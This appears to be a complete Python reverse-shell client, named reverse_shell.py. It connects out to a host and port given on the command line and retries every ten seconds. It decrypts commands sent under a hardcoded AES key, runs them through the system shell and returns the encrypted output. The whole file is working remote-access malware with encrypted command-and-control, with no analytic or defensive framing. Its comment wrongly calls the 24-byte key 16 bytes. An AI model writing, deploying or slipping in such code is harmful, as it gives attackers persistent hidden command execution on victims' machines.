import socket
import subprocess
import sys
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from time import sleep

# AES encryption/decryption
BLOCK_SIZE = 16
KEY = b'ChdtkSnUtJ3yz8Uq3SJJ6TTZ'  # 16 bytes key (must be 16, 24 or 32 bytes long)

def pad(s):
    return s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def encrypt(message):
    raw = pad(message).encode('utf-8')
    cipher = AES.new(KEY, AES.MODE_ECB)
    return b64encode(cipher.encrypt(raw)).decode('utf-8')

def decrypt(enc):
    enc = b64decode(enc)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e)

def client(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            while True:
                data = s.recv(1024).decode('utf-8')
                if not data:
                    break
                decrypted_data = decrypt(data)
                if decrypted_data.lower() == 'exit':
                    break
                command_result = execute_command(decrypted_data)
                encrypted_result = encrypt(command_result)
                s.send(encrypted_result.encode('utf-8'))
            s.close()
        except Exception as e:
            print(f"Connection error: {e}")
            sleep(10)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client(host, port)
